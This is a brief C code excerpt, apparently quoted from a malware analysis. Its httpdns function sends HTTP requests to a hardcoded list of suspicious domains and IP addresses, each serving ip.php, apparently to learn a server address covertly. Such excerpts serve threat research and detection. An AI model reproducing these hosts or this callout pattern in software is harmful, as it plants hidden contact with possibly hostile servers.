...
static int start_url_request(struct http_request_get *http_req)
{
	...
	char *host = evhttp_uri_get_host(http_req->uri);
...
static void httpdns(void)
{
	...
	http_req_get[0] = start_http_requset(base, "d1.luyouqi2017.com/ip.php?0");
	http_req_get[1] = start_http_requset(base, "http://d1.luyouqi2018.com/ip.php");
	http_req_get[2] = start_http_requset(base, "http://d1.bi051loc.work/ip.php");
	http_req_get[3] = start_http_requset(base, "http://d1.it018lao.xyz/ip.php");
	http_req_get[4] = start_http_requset(base, "http://d1.3i0p1lqo.life/ip.php");
	http_req_get[5] = start_http_requset(base, "http://d2.luyouqi2017.com/ip.php");
	http_req_get[6] = start_http_requset(base, "http://d2.luyouqi2018.com/ip.php");
	http_req_get[7] = start_http_requset(base, "http://104.233.226.102/ip.php");
	http_req_get[8] = start_http_requset(base, "http://104.192.83.114/ip.php");
	http_req_get[9] = start_http_requset(base, "http://104.192.80.22/ip.php?9");
